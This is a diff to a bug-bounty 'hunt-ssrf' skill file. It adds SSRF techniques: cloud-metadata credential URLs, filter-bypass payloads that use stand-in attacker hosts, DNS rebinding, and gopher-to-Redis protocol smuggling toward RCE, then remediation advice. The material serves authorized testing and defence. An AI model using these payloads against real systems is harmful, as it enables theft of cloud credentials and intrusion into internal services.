@@ -3,6 +3,9 @@ name: hunt-ssrf
 description: Hunting skill for ssrf vulnerabilities. Built from 15 public bug bounty reports including AWS metadata SSRF (HackerOne $25k Analytics PDF, Shopify Exchange $25k, Capital One 106M-record breach, Dropbox/HelloSign $4,913), GCP metadata SSRF (Snapchat $4k), Azure IMDS SSRF (Azure DevOps $15k chain, ChatGPT Custom Actions MSRC), DNS rebinding SSRF (Concrete CMS, GitLab UrlBlocker), gopher-protocol-to-Redis-RCE (Yahoo Mail $15k), link-preview SSRF (Reddit Matrix $6k), and headless-browser PDF-generator SSRF chains. Use when hunting SSRF on any target — OOB Collaborator confirmation mandatory for blind cases.
 sources: github, hackerone_public, portswigger_research, binarysecurity_research
 report_count: 34
+cwe: [CWE-918, CWE-611, CWE-20, CWE-668]
+cvss_baseline: "Medium (5.4) limited/blind internal reach → High (7.5-8.6) internal service/file access → Critical (9.1-9.8) cloud-metadata credentials or internal-admin RCE. Blind needs OOB proof."
+related_skills: [hunt-cloud-misconfig, cloud-iam-deep, hunt-open-redirect, hunt-xxe, hunt-file-upload, hunt-host-header]
 ---
 
 ## Crown Jewel Targets
@@ -503,6 +506,43 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
     - Year: 2023-2024 — **$15,000 total** across 3 reports
 
 ---
+
+## New Techniques (2024-2026)
+
+### Cloud metadata — the top payout, per-provider
+```
+AWS IMDSv1:  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+AWS IMDSv2:  needs a PUT token — only reachable if the SSRF can send the
+             X-aws-ec2-metadata-token-ttl-seconds PUT and reuse the token (header-controllable SSRF)
+GCP:         http://metadata.google.internal/computeMetadata/v1/  (header: Metadata-Flavor: Google)
+Azure:       http://169.254.169.254/metadata/instance?api-version=2021-02-01  (header: Metadata: true)
+ECS/Fargate: http://169.254.170.2/v2/credentials/<GUID>  ($AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+K8s:         https://kubernetes.default.svc / kubelet :10250  (see hunt-k8s)
+Alibaba/DO/Oracle: 100.100.100.200 / 169.254.169.254 variants
+```
+If the SSRF controls request headers, IMDSv2 and GCP/Azure (which need a header) are reachable; if not, hunt an IMDSv1 host or a header-injecting variant.
+
+### Filter/allowlist bypass (parser-differential, same family as open-redirect)
+```
+http://127.0.0.1  127.1  0  0x7f000001  2130706433  [::1]  [::ffff:127.0.0.1]  0177.0.0.1
+http://localtest.me / http://spoofed.burpcollaborator.net (DNS → 127.0.0.1)
+http://attacker.com@169.254.169.254   http://169.254.169.254#@allowed.com
+http://allowed.com.attacker.com       enclosed-alphanumeric/unicode host tricks
+```
+- **DNS rebinding** — a host you control that resolves to an allowed IP on first lookup (validation) then to `169.254.169.254` on the fetch (TOCTOU); `rebind`/`singularity`.
+- **Redirect-based** — allowed URL returns `302` to an internal target; many fetchers follow redirects (test `Location: http://169.254.169.254/...`).
+
+### Protocol smuggling & blind SSRF
+`gopher://` to speak raw TCP to internal Redis/Memcached/SMTP/HTTP (`gopher://127.0.0.1:6379/_SET...` → cache/queue write → RCE); `dict://`, `file://` (read), `ftp://`. For blind SSRF (no response reflected), confirm with a per-injection **Collaborator/interactsh** subdomain (DNS+HTTP with server source IP) — a reflected body is not required.
+
+### Where SSRF hides (surface list)
+Webhook/callback URLs, URL-import/"fetch from URL", avatar/image-from-URL, PDF/screenshot/headless renderers (`hunt-file-upload`), link-unfurl/preview, SSO/OIDC `request_uri`/JWKS (`hunt-oauth`), XML/SVG parsers (`hunt-xxe`), proxy/health-check params, analytics/ingest endpoints, and SSPP-built backend URLs (`hunt-api-misconfig`).
+
+## Remediation
+
+- Don't fetch user-supplied URLs; if required, resolve + validate against an allowlist of exact hosts/schemes, re-validate after DNS resolution, and **pin** the resolved IP for the actual connection (defeats rebinding + redirect).
+- Block link-local/metadata/private ranges (169.254.0.0/16, 127/8, 10/8, 172.16/12, 192.168/16, ::1, fc00::/7) at the egress; disable unneeded URL schemes (`gopher`, `file`, `dict`, `ftp`); don't follow redirects to new hosts.
+- Enforce **IMDSv2** (token + hop-limit 1); isolate fetchers (no cloud-metadata/internal reach); strip response bodies from blind fetchers.
 
 ## Related Skills & Chains
 
